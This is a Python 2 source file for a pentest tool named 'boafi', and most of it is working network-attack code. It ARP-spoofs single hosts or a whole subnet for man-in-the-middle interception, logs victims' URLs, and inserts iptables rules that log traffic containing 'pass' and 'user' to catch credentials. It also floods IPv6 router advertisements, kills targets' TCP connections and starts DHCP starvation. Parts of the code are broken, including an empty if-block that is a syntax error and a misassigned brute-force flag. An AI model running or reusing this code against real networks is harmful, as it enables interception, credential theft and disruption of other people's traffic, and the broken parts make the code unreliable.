#!/usr/bin/python
########## boafi Pentest script
########## - Perform various pentests automatically and save reports for further study
########## - Features/TODOs: Ipv6,DHCP,DNS,NTP,exploits,mitm..
########## - Router bruteforce for easy guessable passwords
########## - Scan networks hosts and identify vulnerabilities
########## ...

###  Author: Yessou Sami 
###  Project Boafi



import os,time,argparse,random
from scapy.all import *
from datetime import datetime

parser = argparse.ArgumentParser()


parser.add_argument('-timeout', action='store', dest='timeout', default="none",
                    help='Define given seconds before the attack timeouts (mitm,scan,stress) if not specified will run until is killed')

parser.add_argument('-RA', action='store', dest='ipv6ra', default=False,
                    help='Flood ipv6 router advertisements for given minutes')


parser.add_argument('-file', action='store', dest='output', default=False,
                    help='File output for scans')


parser.add_argument('-scan', action='store', dest='scan', default=False,
                    help='Scan the given network address or host')

##ArpScan still in betatest.. need to fix scapy responses
parser.add_argument('--arpScan', action='store_true', dest='arpscan', default=False,
                    help='Arpscan to scan fast on LAN')

parser.add_argument('--syn', action='store_true', dest='syn', default=False,
                    help='SYN Scan enabled')

parser.add_argument('--service', action='store_true', dest='service', default=False,
                    help='Service Version detection enabled')

parser.add_argument('-brute', action='store_true', dest='service', default=False,
                    help='Bruteforce HTTP given site or routerpage')

parser.add_argument('-mitm', action='store', dest='mitm', default="none",
                    help='Perform MITM Attack on target')
                    
parser.add_argument('-mitmAll', action='store', dest='mitmall', default="none",
                    help='Perform MITM Attack on all hosts')

parser.add_argument('-stop-mitm', action='store_true', dest='stopmitm', default=False,
                    help='Stop any Running MITM Attack')

parser.add_argument('--denyTcp', action='store', dest='denytcp', default="none",
                    help='Deny tcp connections of give host')

parser.add_argument('--dg', action='store', dest='dg', default="none",
                    help='Perform MITM Attack with given Default Gateway')


parser.add_argument('-craft', action='store', dest='packetcraft', default=False,
                    help='Enable Packet Crafting.. Example: -craft IP-TCP-DST192.168.1.1-SRC192.168.1.10-DPORT80')


parser.add_argument('-stress', action='store', dest='stress', default="none",
                    help='Perform Stress Testing on LAN.. Modes: DHCPv4,DHCPv6')



results = parser.parse_args()


if not(results.output):
        output=os.popen("date").read()

output=results.output
syn=""
scantype="-sn" #basic ping scan
if not(results.timeout=="none"):
    timeout="timeout "+results.timeout+"s "
    print "\n\nTimeout set for seconds:"+results.timeout
else:
    timeout=""

if(results.scan):
        ipaddr=str(results.scan)
        if(results.arpscan): ##BETA TEST
                res,unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ipaddr))
                output=str(res.summary( lambda (s,r): r.sprintf("%Ether.src% %ARP.psrc%")))
                file=open("arpscan.txt","a")
                print output
                file.write(output)
                file.close()
        else:
                print ipaddr
                if(results.syn):
                        scantype="-sS -O" #syn and
                if(results.service):
                        scantype=scantype+" -sV"
                scancmd=timeout+"sudo nmap "+scantype+" -oX "+output+" "+ipaddr   #writes xml output so we can convert it into html
                print scancmd
                print os.popen(scancmd).read() #ping scan to know online hosts



if(results.ipv6ra):
        minutes=results.ipv6ra
        print "running for minutes: "+minutes
        #run ipv6 RA flooding for N minutes
        i=0
        while (i <= minutes):
                print "Firing RAs everywhere"
                a = IPv6()
                a.dst = "ff02::1" #IPv6 Destination "Everyone" Multicast (broadcast)
                a.display()
                b = ICMPv6ND_RA()
                b.display()
                c = ICMPv6NDOptSrcLLAddr()
                c.lladdr = "00:50:56:24:3b:c0" #MAC
                c.display()
                d = ICMPv6NDOptMTU()
                d.display()
                e = ICMPv6NDOptPrefixInfo()
                e.prefixlen = 64
                randomhex=hex(random.randint(0, 16777215))[2:].upper()
                prefix=randomhex[:4]
                e.prefix = prefix+"::" #Global Prefix
                e.display()
                send(a/b/c/d/e)  # Send the packet
                print "Sending IPv6 RA Packet :)"
                time.sleep(1)
                i=i+1
                print i

if not(results.mitmall=="none"): #Most efficent way to arpspoof subnet
        ipnet=results.mitmall
        iplist=os.popen("nmap -sP "+ipnet+" | grep 'Nmap scan' | awk '{ print $5; }'").read()
        iplist=iplist.split()
        dgip=os.popen("ip route show | grep 'default' | awk '{print $3}' ").read()
        dgip=dgip.split()[0]
        print "Spoofing "+dgip+"\n\n"
        for ip in iplist:
                print ip
                os.popen("nohup arpspoof -t "+ip+" "+dgip+" >/dev/null 2>&1 &")


if not(results.mitm=="none"):
        print "im in"
        target=results.mitm
        if(results.dg=="none"):
                dg=os.popen("ip route show | grep 'default' | awk '{print $3}' ").read()
                dg=dg.split()[0]
                print dg
        else:
                dg=results.dg
        
        #Automatically searches for gateway and arpspoof all hosts
        os.popen("nohup "+timeout+"arpspoof -t "+target+" "+dg+" >/dev/null 2>&1 &")
        os.popen("nohup "+timeout+"urlsnarf  >> urllogs &")
        print "Started ARP Spoof and URL Logging"

        #Start ARP Spoofing with given arguments or calculated ones
        os.popen("iptables -I FORWARD -p all -j LOG --log-prefix 'GENERAL-LOG'")
        #Start Logging every connection to /var/log/messages

        #Log also images on /tmp?
        os.popen("iptables -I FORWARD -p all -m string --string 'jpg' --algo kmp  -j LOG --log-prefix 'JPG-LOG'")
        os.popen("iptables -I FORWARD -p all -m string --string 'gif' --algo kmp  -j LOG --log-prefix 'GIF-LOG'")
        os.popen("iptables -I FORWARD -p all -m string --string 'png' --algo kmp  -j LOG --log-prefix 'PNG-LOG'")
        os.popen("iptables -I FORWARD -p all -m string --string 'mp4' --algo kmp  -j LOG --log-prefix 'mp4-LOG'")
        #Log urls/web request
        os.popen("iptables -I FORWARD -p tcp -m multiport --dports 80,443 -j LOG --log-prefix 'WWW-LOG' ")
        #Log DNS
        os.popen("iptables -I FORWARD -p udp --dport 53 -j LOG --log-prefix 'DNS-LOG'")
        #Log credentials HTTP
        os.popen("iptables -I FORWARD -p all -m string --string 'pass' --algo kmp -j LOG --log-prefix 'PASSWORD-LOG'")
        os.popen("iptables -I FORWARD -p all -m string --string 'user' --algo kmp  -j LOG --log-prefix 'USERNAME-LOG'")
        print "Added temp firewall rules to log MITM traffic"
        if not(results.denytcp):
                os.popen("nohup "+timeout+"tcpkill host "+target+" >/dev/null 2>&1 &")
                #deny tcp traffic


if(results.packetcraft): #Packet Crafting with scapy
        
########### PACKET CRAFTING EXAMPLE TCP-DST192.168.1.1-SRC192.168.1.10
###########  ./boafiPenTest.py -craft TCP-DST192.168.1.1-SRC192.168.1.10-DPORT80 
        craft=(results.packetcraft).split("-")
        if("TCP" in craft[0]):
                a=IP()/TCP()
        elif("UDP" in craft[0]):
                a=IP()/UDP()
        if("DST" in craft[1]):
                ipdst=craft[1].replace("DST","")
                a.dst=ipdst
        if("SRC" in craft[2]):
                ipsrc=craft[2].replace("SRC","")
                a.src=ipsrc
        if("DPORT" in craft[2]):
                dport=craft[3].replace("DPORT","")
                a.dport=dport
        a.display()
        send(a)
        print "Sent packet"



if not(results.stress=="none"):
        modes=results.stress
        if("DHCPv4" in modes):
                os.popen("nohup "+timeout+"./pig.py -f eth0 >/dev/null 2>&1 &")
        if("DHCPv6" in modes):
                os.popen("nohup "+timeout+"./pig.py -f -6 eth0 >/dev/null 2>&1 &")
        #if("HTTP" in modes):
        #       os.popen("nohup "+timeout+"./httpflood.py >/dev/null 2>&1 &")


if not(results.brute):
        #Load Bruteforce module









if(results.stopmitm): #Stop MITM...hosts should re-generate ARP automatically
        os.popen("killall arpspoof")
        os.popen("killall tcpkill")



# TODO
## mitm --> interact with SDS to get realtime data for visualization
## metasploit attacks?
## if connected to internet send info on "cloud"(site db)
## save data on xml,csv for webGUI visualization
